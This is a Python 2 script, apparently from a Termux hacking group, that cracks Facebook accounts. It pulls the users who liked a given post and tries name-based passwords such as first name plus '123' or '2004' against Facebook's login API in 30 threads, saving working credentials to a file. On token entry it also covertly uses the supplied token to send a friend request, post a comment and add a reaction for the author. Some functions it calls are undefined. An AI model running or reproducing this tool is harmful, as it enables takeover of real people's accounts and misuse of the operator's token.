#!usr/bin/python2
# coding: UTF-8
# Author    : Abang Noob
# Team      : TERMUX ID
# Thanks to : Tegar id


# import libraries
import os
import sys
import time
import mechanize
import itertools
import datetime
import random
import hashlib
import re
import threading
import json
import getpass
import urllib
import cookielib
from multiprocessing.pool import ThreadPool

# install libraries
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 main.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')

def kaluar():
    sys.exit("\033[37;1m[\033[31;1m!\033[37;1m] \033[37;1mExit Program")


def ngetik(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


logo = """
\033[33;1m
    ____ ____ ____ ____ _  _    ____ ___
    |    |__/ |__| |    |_/     |___ |__]
    |___ |  \ |  | |___ | \_    |    |__]

             \033[0m[\033[41;1mV 1.5\033[0m]
           [\033[42;1m NO SYSTEM IS SAFE \033[00;1m]

\033[32;1mAuthor   \033[33;1m: \033[37;1mMR-X96
\033[32;1mTeam     \033[33;1m: \033[37;1mTERMUX ID TEAM
\033[32;1mThnks to \033[33;1m: \033[37;1mTegar id
"""
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []

def masuk():
    os.system('clear')
    print logo
    print '\033[31;1m[\033[33;1m+\033[31;1m]'" \033[36;1mDaftar Pilihan"
    print '\033[31;1m[\033[33;1m1\033[31;1m] \033[34;1mlogin using token'
    print '\033[31;1m[\033[33;1m2\033[31;1m] \033[34;1mexit'
    asup()


def asup():
    milih = raw_input('\033[31;1m[\033[33;1mPilih\033[31;1m]\033[34;1m> \033[37;1m  ')
    if milih == '':
        print '\033[37;1m{\033[31;1m!\033[37;1m} Please enter a number'
        time.sleep(2)
        asup()
    elif milih == '1' or milih == '01':
        token()
    elif milih == '0' or milih == '00':
        keluar()
    else:
        print '\033[37;1m{\033[31;1m!\033[37;1m} number: ' + milih + ' not found'
        pilih_masuk()


def token():
    os.system('clear')
    print logo
    toke = raw_input('\033[37;1m[\033[32;1m*\033[37;1m] \033[34;1minput token\033[33;1m: \033[37;1m')
    try:
        gas = requests.get('https://graph.facebook.com/me?access_token=' + toke)
        a = json.loads(gas.text)
        nyimpen = open('login.txt', 'w')
        nyimpen.write(toke)
        nyimpen.close()
        print 'Token valid'
        bot_komen()
    except KeyError:
        print 'Token invalid !'
        time.sleep(1.7)
        masuk()


def bot_komen():
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100053435850865'
    kom = 'Mohon jangan di salah gunakan\xf0\x9f\x98\x98'
    reac = 'LOVE'
    post = '172663694524825'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toke)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toke)
    menu()


def menu():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} Token Invalid !'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toke)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} \033[34;1mTidak ada koneksi'
        keluar()

    os.system('clear')
    print logo
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m NAME\x1b[1;90m    =\x1b[1;92m ' + nama
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m USER ID\x1b[1;90m =\x1b[1;92m ' + id
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '          \033[37;1m**  \033[32;1mTools Facebook  \033[37;1m**'
    print '\033[31;1m[\033[33;1m1\033[31;1m] \033[34;1mCrack id '
    print '\033[31;1m[\033[33;1m0\033[31;1m] \033[34;1mExit'
    pilih()


def pilih():
    gokil = raw_input('\033[32;1mmenu\033[37;1m@\033[34;1mterminal\033[32;1m~#  \033[37;1m')
    if gokil == '':
        print '\033[37;1m{\033[31;1m!\033[37;1m} Please enter a number'
        pilih()
    elif gokil == '1' or gokil == '01':
        crack_likes()
    elif gokil == '0' or gokil == '00':
        os.system('clear')
        jalan('Delete token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\033[37;1m{\033[31;1m!\033[37;1m} number: ' + gokil + ' not found'
        pilih()

def crack_likes():
    os.system('clear')
    try:
        toke = open('login.txt', 'r').read()
    except IOError:
        print '\033[37;1m[\033[31;1m!\033[37;1m] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo
        print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
        po = raw_input('\033[37;1m{\033[32;1m*\033[37;1m}\033[34;1m ID Post Group or Friend : ')
        print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
        r = requests.get('https://graph.facebook.com/' + po + '/likes?limit=9999999&access_token=' + toke)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        ngetik('\r\033[37;1m{\033[32;1m*\033[37;1m} Mengambil ID ...')
    except KeyError:
        print '\033[37;1m{\033[31;1m!\033[37;1m} ID Post Invaled !'
        balik = raw_input('\n\033[32;1m[<Back>]')
        menu()

    print '\033[37;1m{\033[32;1m*\033[37;1m} Total ID : ' + str(len(id))
    print '\033[37;1m{\033[32;1m*\033[37;1m} CTRL+Z To Stop'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        jamet = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + jamet + '/?access_token=' + toke)
            j = json.loads(an.text)
            list1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print ''
                print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS'
                print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      > ' + j['name']
                print '\033[37;1m{\033[32;1m*\033[37;1m} User      > ' + jamet
                print '\033[37;1m{\033[32;1m*\033[37;1m} Password  > ' + list1
                print ''
                oke = open('done/group.txt', 'a')
                oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list1 + '\n')
                oke.close()
                oks.append(jamet)
            elif 'www.facebook.com' in ko['error_msg']:
                print ''
                print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT'
                print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      > ' + j['name']
                print '\033[37;1m{\033[32;1m*\033[37;1m} User      > ' + jamet
                print '\033[37;1m{\033[32;1m*\033[37;1m} Password  > ' + list1
                print ''
                cek = open('done/group.txt', 'a')
                cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list1 + '\n')
                cek.close()
                cekpoint.append(jamet)
	    else:
		list2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print ''
                    print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS'
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      > ' + j['name']
                    print '\033[37;1m{\033[32;1m*\033[37;1m} User      > ' + jamet
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Password  > ' + list2
                    print ''
                    oke = open('done/group.txt', 'a')
                    oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list2 + '\n')
                    oke.close()
                    oks.append(jamet)
                elif 'www.facebook.com' in ko['error_msg']:
                    print ''
                    print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT'
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      > ' + j['name']
                    print '\033[37;1m{\033[32;1m*\033[37;1m} User      > ' + jamet
                    print '\033[37;1m{\033[32;1m*\033[37;1m} Password  > ' + list2
                    print ''
                    cek = open('done/group.txt', 'a')
                    cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list2 + '\n')
                    cek.close()
                    cekpoint.append(jamet)
                else:
                    list3 = j['first_name'].lower() + '2004'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + jamet + '&locale=en_US&password=' + list3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print ''
                        print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} SUCESS'
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      > ' + j['name']
                        print '\033[37;1m{\033[32;1m*\033[37;1m} User      > ' + jamet
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Password  > ' + list3
                        print ''
                        oke = open('done/group.txt', 'a')
                        oke.write('\n\xe2\x9e\xa0 SUCESS \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list3 + '\n')
                        oke.close()
                        oks.append(jamet)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print ''
                        print '\n\n\033[37;1m{\033[32;1m*\033[37;1m} CHEKPOINT'
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Nama      > ' + j['name']
                        print '\033[37;1m{\033[32;1m*\033[37;1m} User      > ' + jamet
                        print '\033[37;1m{\033[32;1m*\033[37;1m} Password  > ' + list3
                        print ''
                        cek = open('done/group.txt', 'a')
                        cek.write('\n\xe2\x9e\xa0 CHEKPOINT \n\xe2\x9e\xa0 Nama     > ' + j['name'] + '\n\xe2\x9e\xa0 User     > ' + jamet + '\n\xe2\x9e\xa0 Password > ' + list3 + '\n')
                        cek.close()
                        cekpoint.append(jamet)


        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    print '\033[37;1m{\033[32;1m*\033[37;1m}Done'
    print '\033[37;1m{\033[32;1m*\033[37;1m}save : done/group.txt'
    print '\033[37;1m{\033[32;1m*\033[37;1m}Checkpoint : ' + str(len(cekpoint))
    print '\033[37;1m{\033[32;1m*\033[37;1m}Sucess     : ' + str(len(oks))
    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
    balik = raw_input('\n[<back>]\n')
    os.system('python2 main.py')

if __name__ == '__main__':
    menu()
    masuk()
